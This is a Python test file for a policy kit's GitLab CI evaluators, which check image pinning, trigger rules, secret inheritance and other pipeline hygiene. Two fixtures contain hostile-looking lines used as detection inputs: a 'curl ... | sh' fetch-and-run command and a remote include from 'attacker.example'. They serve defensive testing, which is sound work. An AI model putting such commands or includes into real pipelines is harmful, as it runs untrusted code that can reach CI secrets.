"""GL-PIPE-001..006 evaluator behavior."""

from __future__ import annotations

from pathlib import Path

from oss_policy_kit.application.evaluators import (
    EvalContext,
    eval_gl_pipe_001,
    eval_gl_pipe_002,
    eval_gl_pipe_003,
    eval_gl_pipe_004,
    eval_gl_pipe_005,
    eval_gl_pipe_006,
)
from oss_policy_kit.domain.models import ControlStatus
from oss_policy_kit.infrastructure.aws_ci_parser import AwsCiAnalysis
from oss_policy_kit.infrastructure.azure_pipeline_parser import AzurePipelineAnalysis
from oss_policy_kit.infrastructure.gitlab_ci_parser import (
    GitLabCiAnalysis,
    analyze_gitlab_ci,
)
from oss_policy_kit.infrastructure.workflow_parser import WorkflowAnalysis


def _ctx(repo: Path, analysis: GitLabCiAnalysis | None = None) -> EvalContext:
    return EvalContext(
        repo_root=repo,
        profile_id="gitlab-level-1",
        workflows=WorkflowAnalysis(),
        azure_pipelines=AzurePipelineAnalysis(),
        aws_ci=AwsCiAnalysis(),
        scorecard=None,
        gitlab_ci=analysis or GitLabCiAnalysis(),
    )


def _write_gitlab_ci(tmp_path: Path, body: str) -> None:
    (tmp_path / ".gitlab-ci.yml").write_text(body, encoding="utf-8")


# --- GL-PIPE-001 ------------------------------------------------------------


def test_gl_pipe_001_fails_when_no_pipeline(tmp_path: Path) -> None:
    out = eval_gl_pipe_001(_ctx(tmp_path))
    assert out.status == ControlStatus.FAIL


def test_gl_pipe_001_passes_when_pipeline_present(tmp_path: Path) -> None:
    _write_gitlab_ci(tmp_path, "test:\n  image: python:3.12-slim\n  script: ['pytest']\n")
    out = eval_gl_pipe_001(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.PASS


def test_gl_pipe_001_fails_on_parse_error(tmp_path: Path) -> None:
    _write_gitlab_ci(tmp_path, "::: not valid yaml :::\n  bad: indent: structure")
    out = eval_gl_pipe_001(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.FAIL


# --- GL-PIPE-002 ------------------------------------------------------------


def test_gl_pipe_002_not_applicable_without_pipeline(tmp_path: Path) -> None:
    out = eval_gl_pipe_002(_ctx(tmp_path))
    assert out.status == ControlStatus.NOT_APPLICABLE


def test_gl_pipe_002_passes_when_all_images_pinned(tmp_path: Path) -> None:
    _write_gitlab_ci(tmp_path, "test:\n  image: python:3.12-slim\n  script: ['pytest']\n")
    out = eval_gl_pipe_002(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.PASS


def test_gl_pipe_002_fails_on_unpinned_image(tmp_path: Path) -> None:
    _write_gitlab_ci(tmp_path, "test:\n  image: ubuntu\n  script: ['echo']\n")
    out = eval_gl_pipe_002(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.FAIL
    assert "ubuntu" in out.reason


def test_gl_pipe_002_fails_on_mutable_tag_latest(tmp_path: Path) -> None:
    """python:latest is a tag, but it's mutable; GL-PIPE-002 must fail it."""
    _write_gitlab_ci(tmp_path, "test:\n  image: python:latest\n  script: ['echo']\n")
    out = eval_gl_pipe_002(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.FAIL
    assert "mutable" in out.reason.lower() or "latest" in out.reason
    assert "python:latest" in out.reason


def test_gl_pipe_002_fails_on_mutable_tag_edge(tmp_path: Path) -> None:
    _write_gitlab_ci(tmp_path, "test:\n  image: alpine:edge\n  script: ['echo']\n")
    out = eval_gl_pipe_002(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.FAIL


# --- GL-PIPE-003 ------------------------------------------------------------


def test_gl_pipe_003_passes_on_safe_script(tmp_path: Path) -> None:
    _write_gitlab_ci(tmp_path, "test:\n  image: alpine:3.19\n  script:\n    - apk add curl\n")
    out = eval_gl_pipe_003(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.PASS


def test_gl_pipe_003_fails_on_curl_pipe_shell(tmp_path: Path) -> None:
    _write_gitlab_ci(tmp_path, "test:\n  image: alpine:3.19\n  script:\n    - curl https://x.example/i.sh | sh\n")
    out = eval_gl_pipe_003(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.FAIL


# --- GL-PIPE-004 ------------------------------------------------------------


def test_gl_pipe_004_passes_without_broad_inherit(tmp_path: Path) -> None:
    _write_gitlab_ci(tmp_path, "test:\n  image: alpine:3.19\n  script: ['echo']\n")
    out = eval_gl_pipe_004(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.PASS


def test_gl_pipe_004_fails_with_inherit_secrets_true(tmp_path: Path) -> None:
    _write_gitlab_ci(tmp_path, "test:\n  image: alpine:3.19\n  inherit:\n    secrets: true\n  script: ['echo']\n")
    out = eval_gl_pipe_004(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.FAIL


# --- GL-PIPE-005 ------------------------------------------------------------


def test_gl_pipe_005_passes_without_remote_include(tmp_path: Path) -> None:
    _write_gitlab_ci(
        tmp_path, "include:\n  - local: '/.gitlab/jobs.yml'\ntest:\n  image: alpine:3.19\n  script: ['echo']\n"
    )
    out = eval_gl_pipe_005(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.PASS


def test_gl_pipe_005_fails_with_remote_include(tmp_path: Path) -> None:
    _write_gitlab_ci(
        tmp_path,
        """
include:
  - remote: 'https://attacker.example/ci.yml'

test:
  image: alpine:3.19
  script: ['echo']
""",
    )
    out = eval_gl_pipe_005(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.FAIL
    assert "attacker.example" in out.reason


# --- GL-PIPE-006 ------------------------------------------------------------


def test_gl_pipe_006_fails_without_trigger_restrictions(tmp_path: Path) -> None:
    _write_gitlab_ci(tmp_path, "test:\n  image: alpine:3.19\n  script: ['echo']\n")
    out = eval_gl_pipe_006(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.FAIL


def test_gl_pipe_006_passes_with_rules(tmp_path: Path) -> None:
    _write_gitlab_ci(
        tmp_path,
        """
test:
  image: alpine:3.19
  script: ['echo']
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
""",
    )
    out = eval_gl_pipe_006(_ctx(tmp_path, analyze_gitlab_ci(tmp_path)))
    assert out.status == ControlStatus.PASS
